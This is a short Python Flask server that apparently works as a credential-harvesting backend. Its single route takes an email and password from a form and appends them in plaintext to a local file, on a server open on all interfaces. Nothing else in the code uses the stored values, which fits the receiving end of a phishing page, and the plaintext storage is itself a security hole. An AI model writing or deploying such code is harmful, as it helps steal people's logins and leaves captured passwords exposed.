from flask import Flask, request

app = Flask(__name__)

@app.route('/save_credentials', methods=['POST'])
def save_credentials():
    email = request.form['email']
    password = request.form['password']
    with open('credentials.txt', 'a') as f:
        f.write(f"Email: {email}\nPassword: {password}\n\n")
    return 'Credentials saved successfully'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
